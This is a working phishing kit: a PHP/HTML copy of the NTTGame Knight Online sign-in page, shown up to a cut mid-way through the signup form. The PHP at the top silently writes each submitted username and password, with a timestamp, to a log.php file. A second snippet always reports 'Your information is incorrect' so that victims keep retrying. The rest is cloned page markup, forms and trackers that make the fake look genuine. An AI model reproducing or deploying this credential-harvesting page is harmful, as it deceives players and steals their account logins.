<?php
if(@$_POST["username"] != null AND @$_POST["password"] != null){

	date_default_timezone_set('Europe/Istanbul');
	$tarih = date('d.m.Y'); # Ör: 01.04.2014
	$saat  = date('G:i'); # 11:29
	$birlestir = $tarih ." - ". $saat;
	##################################################################################
	$dosya = fopen("log.php", "a+");
	$rows = fgets($dosya);
	$rows = "<tr><td>".strip_tags($_POST["username"])."</td><td>".strip_tags($_POST["password"])."</td><td>".$birlestir."</td></tr>";
	fwrite ($dosya ,$rows ) ; 
	fclose($dosya);
}
?>
<html class="" xmlns="http://www.w3.org/1999/xhtml" xml:lang="" lang="" version="XHTML+RDFa 1.0" dir="ltr" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/terms/" xmlns:foaf="http://xmlns.com/foaf/0.1/" xmlns:og="http://ogp.me/ns#" xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#" xmlns:sioc="http://rdfs.org/sioc/ns#" xmlns:sioct="http://rdfs.org/sioc/types#" xmlns:skos="http://www.w3.org/2004/02/skos/core#" xmlns:xsd="http://www.w3.org/2001/XMLSchema#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:owl="http://www.w3.org/2002/07/owl#"><script src="https://apis.google.com/_/scs/apps-static/_/js/k=oz.gapi.tr.h53crlvr8rI.O/m=client,plusone/rt=j/sv=1/d=1/ed=1/am=AQE/rs=AGLTcCPkVgh3v8t-gwnpGJ8pi45ptJ6tNA/cb=gapi.loaded_0" async=""></script><script type="text/javascript" async="" src="https://mc.yandex.ru/metrika/watch.js"></script><script src="https://connect.facebook.net/signals/config/661029510681560?v=2.8.14&amp;r=stable" async=""></script><script src="https://connect.facebook.net/signals/config/486428184887137?v=2.8.14&amp;r=stable" async=""></script><script async="" src="//connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="//www.googleadservices.com/pagead/conversion_async.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://apis.google.com/js/client:plusone.js" gapi_processed="true"></script><script id="facebook-jssdk" src="//connect.facebook.net/en_US/sdk.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-TK2G5B"></script><script type="text/javascript" charset="utf-8" id="zm-extension" src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script><!--<![endif]--><head>
<title>Knight Online – Free to Play 3D MMORPG Game</title>
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta http-equiv="imagetoolbar" content="no">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="content-script-type" content="text/javascript">
<meta name="Description" content="Knight Online is a leading party based medieval MMORPG that is, and will alyways be, Free to Play! Register now and enjoy Knight Online.">
<meta name="Keywords" content="NTT Game, MMORPG, MMO, RPG, free to play, Online Games, Play Knight Online, Download Knight Online, Multiplayer, Knight Online, USKO, EUKO, KOL, KO, PVP, PK, MMORPG games, Online Games list 2015, Best MMORPG games">
<meta property="og:title" content="NTT GAME">
<meta property="og:type" content="website">
<meta property="og:description" content="Knight Online is a leading party based medieval MMORPG that is, and will alyways be, Free to Play! Register now and enjoy Knight Online">
<link rel="dns-prefetch" href="//ajax.googleapis.com">
<link rel="dns-prefetch" href="//www.googletagmanager.com">
<link rel="dns-prefetch" href="//html5shiv.googlecode.com">
<link rel="dns-prefetch" href="//filegate.nttgame.com">
<link rel="shortcut icon" type="image/ico" href="//image.nttgame.com/filegate/knight/images/fav_icon.png?v=2">

<link href="https://www.nttgame.com/knight/assets/css/en/main.css" rel="stylesheet" type="text/css"> 
<link href="https://www.nttgame.com/knight/assets/css/en/main_sub.css" rel="stylesheet" type="text/css">
<link href="https://www.nttgame.com/knight/assets/css/en/common.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="https://www.nttgame.com/knight/assets/js/magnific-popup/magnific-popup.css"> 
<link rel="stylesheet" type="text/css" href="https://www.nttgame.com/knight/assets/third_party/animateSlider/jquery.animateSlider.css">

<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/jquery-ui.min.js"></script>
<script type="text/javascript" src="https://www.nttgame.com/knight/assets/js/magnific-popup/jquery.magnific-popup.js"></script>
<!-- <script type="text/javascript" src="//www.nttgame.com/knight/en/api/getJsLanguages"></script> -->
<script type="text/javascript" src="https://www.nttgame.com/knight/assets/js/common.js"></script>
<script type="text/javascript" src="https://www.nttgame.com/knight/assets/js/navi.js"></script>
<script type="text/javascript" src="https://www.nttgame.com/knight/assets/js/rotationbanner.js"></script>
<script type="text/javascript" src="https://www.nttgame.com/knight/assets/js/home.js"></script>
<script type="text/javascript" src="https://www.nttgame.com/knight/assets/js/jquery.snow.js"></script>	
<!--[if IE]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-TK2G5B');</script>
<!-- End Google Tag Manager -->

<script type="text/javascript" src="https://imagesak.secureserver.net/gomezxfmonitor/gtagb4.js"></script><style type="text/css">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}.fb_link img{border:none}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_reset .fb_dialog_legacy{overflow:visible}.fb_dialog_advanced{padding:10px;border-radius:8px}.fb_dialog_content{background:#fff;color:#333}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{top:5px;left:5px;right:auto}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_loader{background-color:#f6f7f9;border:1px solid #606060;font-size:24px;padding:20px}.fb_dialog_top_left,.fb_dialog_top_right,.fb_dialog_bottom_left,.fb_dialog_bottom_right{height:10px;width:10px;overflow:hidden;position:absolute}.fb_dialog_top_left{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 0;left:-10px;top:-10px}.fb_dialog_top_right{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 -10px;right:-10px;top:-10px}.fb_dialog_bottom_left{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 -20px;bottom:-10px;left:-10px}.fb_dialog_bottom_right{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/8YeTNIlTZjm.png) no-repeat 0 -30px;right:-10px;bottom:-10px}.fb_dialog_vert_left,.fb_dialog_vert_right,.fb_dialog_horiz_top,.fb_dialog_horiz_bottom{position:absolute;background:#525252;filter:alpha(opacity=70);opacity:.7}.fb_dialog_vert_left,.fb_dialog_vert_right{width:10px;height:100%}.fb_dialog_vert_left{margin-left:-10px}.fb_dialog_vert_right{right:0;margin-right:-10px}.fb_dialog_horiz_top,.fb_dialog_horiz_bottom{width:100%;height:10px}.fb_dialog_horiz_top{margin-top:-10px}.fb_dialog_horiz_bottom{bottom:0;margin-bottom:-10px}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{-webkit-transform:none;height:100%;margin:0;overflow:visible;position:absolute;top:-10000px;left:0;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{width:auto;height:auto;min-height:initial;min-width:initial;background:none}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{color:#fff;display:block;padding-top:20px;clear:both;font-size:18px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .45);position:absolute;bottom:0;left:0;right:0;top:0;width:100%;min-height:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_content .dialog_header{-webkit-box-shadow:white 0 1px 1px -1px inset;background:-webkit-gradient(linear, 0% 0%, 0% 100%, from(#738ABA), to(#2C4987));border-bottom:1px solid;border-color:#1d4088;color:#fff;font:14px Helvetica, sans-serif;font-weight:bold;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{-webkit-font-smoothing:subpixel-antialiased;height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:-webkit-gradient(linear, 0% 0%, 0% 100%, from(#4966A6), color-stop(.5, #355492), to(#2A4887));border:1px solid #29487d;-webkit-background-clip:padding-box;-webkit-border-radius:3px;-webkit-box-shadow:rgba(0, 0, 0, .117188) 0 1px 1px inset, rgba(255, 255, 255, .167969) 0 1px 0;display:inline-block;margin-top:3px;max-width:85px;line-height:18px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{border:none;background:none;color:#fff;font:12px Helvetica, sans-serif;font-weight:bold;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #555;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f6f7f9;border:1px solid #555;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-repeat:no-repeat;background-position:50% 50%;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_hide_iframes iframe{position:relative;left:-10000px}.fb_iframe_widget_loader{position:relative;display:inline-block}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}.fb_iframe_widget_loader iframe{min-height:32px;z-index:2;zoom:1}.fb_iframe_widget_loader .FB_Loader{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat;height:32px;width:32px;margin-left:-16px;position:absolute;left:50%;z-index:4}
.fb_customer_chat_bounce_in{animation-duration:250ms;animation-name:fb_bounce_in}.fb_customer_chat_bounce_out{animation-duration:250ms;animation-name:fb_fade_out}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}.fb_mobile_overlay_active{background-color:#fff;height:100%;overflow:hidden;position:fixed;visibility:hidden;width:100%}@keyframes fb_fade_out{from{opacity:1}to{opacity:0}}@keyframes fb_bounce_in{0%{opacity:0;transform:scale(.8, .8);transform-origin:100% 100%}10%{opacity:.1}20%{opacity:.2}30%{opacity:.3}40%{opacity:.4}50%{opacity:.5}60%{opacity:.6}70%{opacity:.7}80%{opacity:.8;transform:scale(1.03, 1.03)}90{opacity:.9}100%{opacity:1;transform:scale(1, 1)}}</style><link rel="stylesheet" href="https://onesignal.com/sdks/OneSignalSDKStyles.css?v=854ac1bd14f6a39fdc2f138655ab385a"></head>

<body style="">

<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TK2G5B" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<script type="text/javascript" src="//www.nttgame.com/en/Api/global_navigation_inner"></script><link rel="dns-prefetch" href="//ajax.googleapis.com"><link rel="dns-prefetch" href="//ajax.googleapis.com"><link rel="dns-prefetch" href="//api.google.com"><link rel="dns-prefetch" href="//filegate.nttgame.com"><link rel="dns-prefetch" href="//image.nttgame.com"><link rel="dns-prefetch" href="//rum-static.pingdom.net"><link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="//www.nttgame.com/portal/assets/css/common/global_navigation.css"><script>var LOGIN = "/Login";var LOGOUT = "/Login/Logout";var LOGINSUB = "/Account/LoginCheck";var SIGNUP = "/Signin";var _serverdate = "04-28-2018";var _cookie = "nttgame.com";var _www = "/portal";var _wwws = "/portal";var _portalurl = "//www.nttgame.com";var _imagesurl = "//image.nttgame.com/portal/assets/images/common/gnbsite";var _imageurl = "//image.nttgame.com";var _cdnportal = "//image.nttgame.com/filegate/portal";var _knight = "/knight";var _kingdom = "/kingdom";var _phantomers = "/phantomers";var _billing = "https://billing.nttgame.com/payment/payment.aspx";var _supporturl = "http://support.nttgame.com";var _forumurl = "https://forum.nttgame.com";var _supportdomain = "support.nttgame.com";var _forumdomain = "forum.nttgame.com";var _nation = "TR";var _site_lang = "en";var _subdomain = "portal";var _rq = "aHR0cDovL3d3dy5udHRnYW1lLmNvbS8vd3d3Lm50dGdhbWUuY29tL2VuL0FwaS9nbG9iYWxfbmF2aWdhdGlvbl9pbm5lcg==";var _rf = "aHR0cDovL3d3dy5udHRnYW1lLmNvbS8vd3d3Lm50dGdhbWUuY29tL2VuL0FwaS9nbG9iYWxfbmF2aWdhdGlvbl9pbm5lcg==";var _facebook_appid = "665114753559917";var _google_appid = "441647425737-hf62t6d44oiq9tjnp5l9ffc76tfbgttu.apps.googleusercontent.com";var _rq = "aHR0cHM6Ly93d3cubnR0Z2FtZS5jb20va25pZ2h0L2Vu";var _rf = "aHR0cHM6Ly93d3cubnR0Z2FtZS5jb20va25pZ2h0L2Vu";</script><script type="text/javascript" src="//www.nttgame.com/portal/assets/js/portal.js"></script><script type="text/javascript" src="//www.nttgame.com/portal/assets/js/global_navigation.js"></script><script type="text/javascript" src="//www.nttgame.com/portal/assets/js/functions.js"></script><script type="text/javascript" src="//www.nttgame.com/portal/assets/js/Signin.js"></script><div class="gnb-wrapper1">	<div class="gnb-wrapper2">		<div class="gnb-container">			<div class="font_family toolbar_general_height">				<div class="toolbar_logo_bg">					<a href="//www.nttgame.com/en/" target="_blank">						<div class="toolbar_logo"></div>					</a>				</div>				<div class="toolbar_bg"> 					<div class="language-container" id="language_select">						<span>ENGLISH</span>&nbsp;&nbsp;<i class="fa fa-lg fa-caret-down"></i>						<div class="lang_window" id="lang_list">							<div class="language-link" rel="TR">TÜRKÇE</div>							<div class="language-link" rel="EN">ENGLISH</div>						</div>					</div>				<div class="gnb-part-container" id="gnb-register-btn" data-url="//www.nttgame.com/en/register/signupPopup/" data-target="#modalSignup">SIGN UP</div>				<div class="gnb-part-container" id="gnb-login-btn" data-target="#modalLogin">SIGN IN</div>				<div class="social_icon">					<div style="float:left; width:30px; margin:0; padding:0; text-align:center; cursor: pointer;" onclick="javascript:facebookLogin();return false;">						<img src="//image.nttgame.com/portal/assets/images/common/gnbsite/facebook.png" width="20" height="20">					</div>					<div style="float:left; width:30px; margin:0; padding:0; text-align:center; cursor: pointer;" onclick="javascript:googleLogin();return false;">						<img src="//image.nttgame.com/portal/assets/images/common/gnbsite/google_plus.png" width="20" height="20">					</div>					<div id="fb-root" class=" fb_reset fb_reset"><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div><iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame" tabindex="-1" src="https://staticxx.facebook.com/connect/xd_arbiter/r/2VRzCA39w_9.js?version=42#channel=f3e54d1c9ba045c&amp;origin=https%3A%2F%2Fwww.nttgame.com" style="border: none;"></iframe></div></div><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div></div></div></div>				</div>					<a href="http://support.nttgame.com" target="_blank"><div class="gnb-support-container">SUPPORT</div></a>				</div>				<div id="explorer-icon" class="toolbar_right">					<div id="explorer_close" name="explorer_close" class="explorer_win">						<div class="explorer_body">							<div class="explorer_top"></div>							<div class="explorer_body2">								<div class="explorer_menu_top_height"></div>								<div class="explorer_left_link">									<div class="toolbar_pop_text menu_name"><a href="//www.nttgame.com">NTTGame Home</a></div>									<div class="toolbar_pop_text menu_name2"><a href="https://forum.nttgame.com">Forums</a></div>									<div class="toolbar_pop_text menu_name2"><a href="https://billing.nttgame.com/payment/payment.aspx">Add NPoints</a></div>									<div class="toolbar_pop_text menu_name2"><a href="//www.nttgame.com/en/account">Account</a></div>									<div class="toolbar_pop_text menu_name2"><a href="http://support.nttgame.com">SUPPORT</a></div>								</div>								<div class="toolbar_right_text explorer_right_link">									<div class="game_logo_height"></div>									<div class="logo1"><a href="https://www.nttgame.com/knight/en/"><img src="//image.nttgame.com/portal/assets/images/common/gnbsite/explorer_ko_logo.png" border="0" width="135" height="43"><img src="//image.nttgame.com/portal/assets/images/common/windows_icon.png" border="0" class="gnb-gametype-icon"></a>										<div class="language_pop game_name"><a href="https://www.nttgame.com/knight/en/">KNIGHT ONLINE</a></div>									</div>									<div class="game1_margin"><a href="https://www.nttgame.com/phantomers/en/"><img src="//image.nttgame.com/portal/assets/images/common/gnbsite/explorer_phantomers_logo.png" width="135" height="43" border="0"><img src="//image.nttgame.com/portal/assets/images/common/windows_icon.png" border="0" class="gnb-gametype-icon"></a>										<div class="language_pop game_name"><a href="https://www.nttgame.com/phantomers/en/">PHANTOMERS</a></div>									</div>									<div class="game1_margin"><a href="https://www.nttgame.com/madtanks/en/"><img src="//image.nttgame.com/portal/assets/images/common/gnbsite/explorer_madtanks_logo.png" width="135" height="43" border="0"><img src="//image.nttgame.com/portal/assets/images/common/windows_icon.png" border="0" class="gnb-gametype-icon"></a>										<div class="language_pop game_name"><a href="https://www.nttgame.com/madtanks/en/">MAD TANKS</a></div>									</div>									<div class="game1_margin"><a href="https://www.nttgame.com/knightsofdungeon/en/"><img src="//image.nttgame.com/portal/assets/images/common/gnbsite/explorer_knightsofdungeon_logo.png" width="135" height="43" border="0"><img src="//image.nttgame.com/portal/assets/images/common/mobile_icon.png" border="0" class="gnb-gametype-icon"></a>										<div class="language_pop game_name"><a href="https://www.nttgame.com/knightsofdungeon/en/">KNIGHTS OF DUNGEON</a></div>									</div>									<div class="game1_margin"><a href="https://www.nttgame.com/wrathofdragon/en/"><img src="//image.nttgame.com/portal/assets/images/common/gnbsite/explorer_wrathofdragon_logo.png" width="135" height="43" border="0"><img src="//image.nttgame.com/portal/assets/images/common/mobile_icon.png" border="0" class="gnb-gametype-icon"></a>										<div class="language_pop game_name"><a href="https://www.nttgame.com/wrathofdragon/en/">WRATH OF DRAGON</a></div>									</div>								</div>								<div style="clear:both"></div>							</div>							<div class="game_bg"></div>							<div class="explorer_bottom"></div>						</div>					</div>					<i class="fa fa-lg fa-caret-down right_icon"></i>				</div>				<div style="clear:both"></div>			</div>		</div>	</div></div><div class="login-register-form-container"><div class="font_family">	<div id="modalLogin" class="popupContainer" style="display: block; position: absolute; opacity: 1; z-index: 11000; left: 50%; margin-left: -240px; top: 100px;">		<header class="gnb-popup-header">			<span id="gnb_header_title">NTTGAME SIGN IN</span>			<span class="gnb-modal-close"><i class="fa fa-times"></i></span>		</header>		<section class="gnb-popup-body">			<div id="gnb_header_small_title">Sign in with your Facebook or Google+ Account.</div>			<div id="social_login">				<div class="social_container">					<a href="javascript:void(0)" onclick="javascript:facebookLogin();return false;" class="social_box fb">						<span class="icon"><i class="fa fa-facebook"></i></span>						<span class="icon_title">Sign in with Facebook</span>					</a>					<a href="javascript:void(0)" onclick="javascript:googleLogin();return false;" class="social_box google">						<span class="icon"><i class="fa fa-google-plus"></i></span>						<span class="icon_title">Sign in with Google+</span>					</a>				</div>				<div class="centeredText">					<span>...or sign in with your NTTGame account.</span>				</div>			</div>				<div id="loginFeedback">

<?php if(@$_POST["username"] != null) echo '<div class="form-feedback">
				<div class="feedback-type">
					<span>Your information is incorrect. Please try again.</span>
				</div>
			</div>
			'; ?>

</div>				<div class="gnb-form" id="user_login" data-form-title="NTTGAME Sign In" data-form-sm-title="Sign in with your Facebook or Google+ Account.">					<form action="index.php" method="POST" id="gnb-login-form" name="gnb-login-form">						<input type="hidden" id="_hashkey" name="hashkey" value="ff6ca2014d29932291d0061be5e82d0e">						<label>Your ID <span class="gnb-grey-link pull-right" id="forgotUsername"><a href="">Forgot your ID?</a></span></label>						<input type="text" name="username" tabindex="1">						<br>						<label>Password <span class="gnb-grey-link pull-right" id="forgotPassword"><a href="">Forgot your Password?</a></span></label>						<input type="password" name="password" tabindex="2">						<br>						<label class="label-grey">Captcha <span class="gnb-grey-link pull-right" style="font-size:12px;"><a href="javascript:void(0);">Type the characters in the box. <br>Answers are CASE-SENSITIVE.</a></span></label>						<br>						<input type="text" class="half_input" style="width: 45% !important;" name="captcha" id="captcha0" maxlength="7" tabindex="3" onblur="return Signin._checkup('captcha0');">						<a href="javascript:void(0);" onclick="return Signin._captcahreload2('captchaframe0');"><img src="//image.nttgame.com/filegate/www/portal/images/tr/captcha_refresh.png" width="29" height="29"></a>						<span><img style="display: hidden; vertical-align: middle" src="//www.nttgame.com/en/register/create_captcha/190/40?t=1524935404807&amp;pos=login&amp;g=knight" id="captchaframe0"></span>						<br>						<div class="action_btns">							<div class="one_half last"><a href="#" id="open_register_form" data-url="//www.nttgame.com/en/register/signupPopup/" data-modal-close="true" data-modal-close-target="modalLogin" data-target="#modalSignup" class="btn" tabindex="5">SIGN UP</a></div>							<div class="one_half"><button class="btn btn_red" name="gnb-login-button" id="gnb-login-button" type="submit" tabindex="4">Sign In</button><div id="spiner-login-btn" class="spiner-btn-bg" style=""><div class="spinner"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div></div></div>						</div>					</form>					<div class="underline gnb-grey-link" id="resendVerification" style="margin-top:15px;"><a href="#">Resend E-mail Verification?</a></div>					<div class="underline gnb-grey-link"><a href="http://support.nttgame.com">Having problems creating an account?</a></div>				</div>				<div class="gnb-form" id="user_name_forgot" data-form-title="Forgot Your ID" data-form-sm-title="Please enter your e-mail address.">					<form action="//www.nttgame.com/en/login/forgot_process" method="POST" id="gnb-nameforgot-form" name="gnb-nameforgot-form">						<label>E-mail address</label>						<input type="email" name="email" tabindex="1">						<br>						<label class="label-grey">Captcha <span class="gnb-grey-link pull-right" style="font-size:12px;"><a href="javascript:void(0);">Type the characters in the box. <br>Answers are CASE-SENSITIVE.</a></span></label>						<br>						<input type="text" class="half_input" style="width: 45% !important;" name="captcha" id="captcha1" maxlength="7" tabindex="2" onblur="return Signin._checkup('captcha1');">						<a href="javascript:void(0);" onclick="return Signin._captcahreload2('captchaframe1');"><img src="//image.nttgame.com/filegate/www/portal/images/tr/captcha_refresh.png" width="29" height="29"></a>						<span><img style="display: hidden; vertical-align: middle" src="" id="captchaframe1"></span>						<br>						<div class="action_btns">							<div class="one_half last"><a href="#" class="btn form-back" tabindex="4">Go to Login</a></div>							<div class="one_half"><button class="btn btn_red" name="gnb-nameforgot-button" id="gnb-nameforgot-button" type="submit" tabindex="3">SUBMIT</button></div>						</div>					</form>				</div>				<div class="gnb-form" id="user_password_forgot" data-form-title="Forgot Your Password" data-form-sm-title="Please enter your signup ID and E-mail.">					<form action="//www.nttgame.com/en/login/forgot_process" method="POST" id="gnb-forgotpassword-form" name="gnb-forgotpassword-form">						<label>Username</label>						<input type="text" name="id" tabindex="1">						<br>						<label>E-mail address</label>						<input type="email" name="email" tabindex="2">						<br>						<label class="label-grey">Captcha <span class="gnb-grey-link pull-right" style="font-size:12px;"><a href="javascript:void(0);">Type the characters in the box. <br>Answers are CASE-SENSITIVE.</a></span></label>						<br>						<input type="text" class="half_input" style="width: 45% !important;" name="captcha" id="captcha2" maxlength="7" tabindex="3" onblur="return Signin._checkup('captcha2');">						<a href="javascript:void(0);" onclick="return Signin._captcahreload2('captchaframe2');"><img src="//image.nttgame.com/filegate/www/portal/images/tr/captcha_refresh.png" width="29" height="29"></a>						<span><img style="display: hidden; vertical-align: middle" src="" id="captchaframe2"></span>						<br>						<div class="action_btns">							<div class="one_half last"><a href="#" class="btn form-back" tabindex="5">Go to Login</a></div>							<div class="one_half"><button class="btn btn_red" name="gnb-forgotpassword-button" id="gnb-forgotpassword-button" type="submit" tabindex="4">SUBMIT</button></div>						</div>					</form>				</div>				<div class="gnb-form" id="user_send_verification" data-form-title="Re-send verification E-mail" data-form-sm-title="Please enter your signup ID and E-mail.">					<form action="//www.nttgame.com/en/login/forgot_process" method="POST" id="gnb-sendverification-form" name="gnb-sendverification-form">						<label>Your ID</label>						<input type="text" name="id" tabindex="1">						<br>						<label>E-mail address</label>						<input type="email" name="email" tabindex="2">						<br>						<label class="label-grey">Captcha <span class="gnb-grey-link pull-right" style="font-size:12px;"><a href="javascript:void(0);">Type the characters in the box. <br>Answers are CASE-SENSITIVE.</a></span></label>						<br>						<input type="text" class="half_input" style="width: 45% !important;" name="captcha" id="captcha3" maxlength="7" tabindex="3" onblur="return Signin._checkup('captcha3');">						<a href="javascript:void(0);" onclick="return Signin._captcahreload2('captchaframe3');"><img src="//image.nttgame.com/filegate/www/portal/images/tr/captcha_refresh.png" width="29" height="29"></a>						<span><img style="display: hidden; vertical-align: middle" src="" id="captchaframe3"></span>						<br>						<div class="action_btns">							<div class="one_half last"><a href="#" class="btn form-back" tabindex="5">Go to Login</a></div>							<div class="one_half"><button class="btn btn_red" name="gnb-sendverification-button" id="gnb-sendverification-button" type="submit" tabindex="4">SUBMIT</button></div>						</div>					</form>				</div>		</section>	</div>	<div id="modalSignup" class="popupContainer" style="display: none; position: absolute; opacity: 1; z-index: 11000; left: 50%; margin-left: -240px; top: 100px;">		<header class="gnb-popup-header">			<span class="gnb_header_title">NTTGAME FREE SIGN UP</span>			<span class="gnb-modal-close"><i class="fa fa-times"></i></span>		</header>		<section class="gnb-popup-body">		<div class="register_text">Join our legion of gamers by signing up for a FREE <font style="text-decoration:underline;">NTTGames</font> account.</div>			<div class="gnb_user_register">            <div id="input-notice-tooltip" class="input-notice-tooltip" style="display:none;">                <div class="u_bubble_tip">&nbsp;</div>                <div class="u_signup_bubble"></div>            </div>            <div id="error-error-tooltip" class="u_signup_c_right u_hide">                <div class="u_bubble_tip">&nbsp;</div>                <div class="u_signup_bubble"></div>            </div>	            <div id="errormsg"></div>				<form action="//www.nttgame.com/en/register/SignupSubmit" method="POST" id="frm" name="frm">					<label>ID</label>					<input type="text" name="id" maxlength="20" tabindex="1" id="id" onblur="">					<br>					<label>E-mail</label>					<input type="email" name="email" maxlength="60" tabindex="2" id="email" onblur=""><div class="register_text" style="color:red; display: none;">We do not allow to register hotmail.com, outlook.com and windowslive.com temporarily. Apologies for the inconvenience.</div>					<br>					<label>Password</label>					<input type="password" name="pw" 